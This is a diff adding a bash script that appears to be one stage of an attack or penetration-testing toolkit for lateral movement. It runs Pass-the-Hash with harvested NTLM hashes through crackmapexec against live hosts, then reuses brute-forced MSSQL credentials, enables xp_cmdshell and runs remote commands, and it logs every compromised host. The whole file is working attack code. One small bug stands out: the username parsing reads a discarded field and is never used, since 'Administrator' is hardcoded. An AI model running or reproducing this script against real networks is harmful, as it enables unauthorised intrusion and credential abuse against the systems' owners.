@@ -1,0 +1,167 @@
+#!/usr/bin/env bash
+
+# Lateral movement via Pass-the-Hash and credential reuse.
+# Discovers additional live hosts in the subnet, then attempts:
+#   1. Pass-the-Hash using NTLM hashes from 04_hashdump
+#   2. MSSQL credential reuse against any newly found 1433 listeners
+# Also logs all the successful pivots for the final report.
+
+OUTDIR="./recon"
+CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
+LOOT_DIR="$OUTDIR/loot"
+PIVOT_DIR="$OUTDIR/pivot"
+TARGETS_FILE="$OUTDIR/hosts/targets.txt"
+mkdir -p "$PIVOT_DIR"
+
+if [[ ! -f "$CREDS_FILE" ]]; then
+    echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
+    exit 1
+fi
+if [[ ! -d "$LOOT_DIR" ]]; then
+    echo "[-] $LOOT_DIR not found. Run 04_hashdump first."
+    exit 1
+fi
+
+# Build list of already-compromised IPs so we skip them
+declare -a KNOWN_TARGETS=()
+while IFS=: read -r IP _; do
+    KNOWN_TARGETS+=("$IP")
+done < "$CREDS_FILE"
+
+is_known() {
+    local CHECK="$1"
+    for K in "${KNOWN_TARGETS[@]}"; do
+        [[ "$K" == "$CHECK" ]] && return 0
+    done
+    return 1
+}
+
+echo "[*] Starting lateral movement phase"
+echo "[*] Known compromised hosts: ${KNOWN_TARGETS[*]}"
+echo ""
+
+
+# Phase 1: Pass-the-Hash against all live hosts (excluding already owned)
+
+echo "[*] Phase 1: Pass-the-Hash with harvested NTLM hashes"
+
+# Collect all unique NTLM hashes from loot
+HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)
+
+if [[ -z "$HASH_LIST" ]]; then
+    echo "[-] No NTLM hashes found in $LOOT_DIR. Skipping PtH phase."
+else
+    if [[ ! -f "$TARGETS_FILE" ]]; then
+        echo "[-] $TARGETS_FILE not found. Skipping PtH — no host list."
+    else
+        while read -r HOST; do
+            is_known "$HOST" && continue
+
+            echo ""
+            echo "[*] Trying PtH against $HOST..."
+            SAFE_HOST="${HOST//./_}"
+            PTH_LOG="$PIVOT_DIR/${SAFE_HOST}_pth.txt"
+
+            while IFS=: read -r _ RID LMHASH NTHASH _; do
+                [[ -z "$NTHASH" ]] && continue
+                # Extract username from the hash line (format: host\user:RID:LM:NT:::)
+                HASH_USER=$(echo "$_" | cut -d'\' -f2 2>/dev/null)
+                [[ -z "$HASH_USER" ]] && continue
+
+                # Try crackmapexec for PtH validation
+                RESULT=$(crackmapexec smb "$HOST" -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)
+
+                if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
+                    echo "[+] PtH SUCCESS on $HOST with hash $NTHASH"
+                    echo "$HOST:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
+
+                    # Run basic recon on the new host
+                    echo "[*] Running recon on $HOST via PtH..."
+                    crackmapexec smb "$HOST" -u "Administrator" -H "$NTHASH" \
+                        -x "hostname && ipconfig /all && net localgroup administrators" 2>&1 | \
+                        tee "$PTH_LOG"
+
+                    echo "[+] PtH recon saved to $PTH_LOG"
+                    KNOWN_TARGETS+=("$HOST")
+                    break
+                fi
+            done <<< "$HASH_LIST"
+
+            if ! is_known "$HOST"; then
+                echo "[-] PtH failed on $HOST"
+            fi
+        done < "$TARGETS_FILE"
+    fi
+fi
+
+
+# Phase 2: MSSQL credential reuse against any other 1433 listeners
+
+echo ""
+echo "[*] Phase 2: MSSQL credential reuse on remaining hosts"
+
+MSSQL_TARGETS="$OUTDIR/hosts/mssql-targets.txt"
+if [[ ! -f "$MSSQL_TARGETS" ]]; then
+    echo "[-] $MSSQL_TARGETS not found. Skipping credential reuse."
+else
+    # Read known good creds (just user:pass pairs, deduplicated)
+    declare -a CRED_PAIRS=()
+    while IFS=: read -r _ _ U P; do
+        CRED_PAIRS+=("${U}:${P}")
+    done < "$CREDS_FILE"
+    # Deduplicate
+    readarray -t CRED_PAIRS < <(printf '%s\n' "${CRED_PAIRS[@]}" | sort -u)
+
+    while IFS=: read -r TARGET_IP TARGET_PORT; do
+        is_known "$TARGET_IP" && continue
+
+        echo ""
+        echo "[*] Trying credential reuse on $TARGET_IP:$TARGET_PORT..."
+        SAFE_TARGET="${TARGET_IP//./_}"
+
+        for CRED in "${CRED_PAIRS[@]}"; do
+            U="${CRED%%:*}"
+            P="${CRED#*:}"
+
+            RESULT=$(printf "select @@servername;\nexit\n" | \
+                mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)
+
+            if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press\|ENVCHANGE"; then
+                echo "[+] Credential reuse SUCCESS: $U:$P on $TARGET_IP:$TARGET_PORT"
+                echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$PIVOT_DIR/credreuse-successes.txt"
+
+                # Run basic OS recon through xp_cmdshell
+                PIVOT_LOG="$PIVOT_DIR/${SAFE_TARGET}_mssql_pivot.txt"
+                printf "sp_configure 'show advanced options', '1';\nRECONFIGURE;\nsp_configure 'xp_cmdshell', '1';\nRECONFIGURE;\nexec master..xp_cmdshell 'hostname';\nexec master..xp_cmdshell 'ipconfig /all';\nexec master..xp_cmdshell 'net localgroup administrators';\nexit\n" | \
+                    mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1 | \
+                    tee "$PIVOT_LOG"
+
+                # Append to the master creds file so cleanup covers this host
+                echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$CREDS_FILE"
+                KNOWN_TARGETS+=("$TARGET_IP")
+                echo "[+] Pivot recon saved to $PIVOT_LOG"
+                break
+            fi
+        done
+
+        if ! is_known "$TARGET_IP"; then
+            echo "[-] No valid credentials for $TARGET_IP:$TARGET_PORT"
+        fi
+    done < "$MSSQL_TARGETS"
+fi
+
+echo ""
+echo "[+] Lateral movement phase complete."
+echo "[+] Total compromised hosts: ${#KNOWN_TARGETS[@]}"
+printf '    %s\n' "${KNOWN_TARGETS[@]}"
+
+if [[ -f "$PIVOT_DIR/pth-successes.txt" ]]; then
+    echo ""
+    echo "[+] PtH successes:"
+    cat "$PIVOT_DIR/pth-successes.txt" | sed 's/^/    /'
+fi
+if [[ -f "$PIVOT_DIR/credreuse-successes.txt" ]]; then
+    echo ""
+    echo "[+] Credential reuse successes:"
+    cat "$PIVOT_DIR/credreuse-successes.txt" | sed 's/^/    /'
+fi
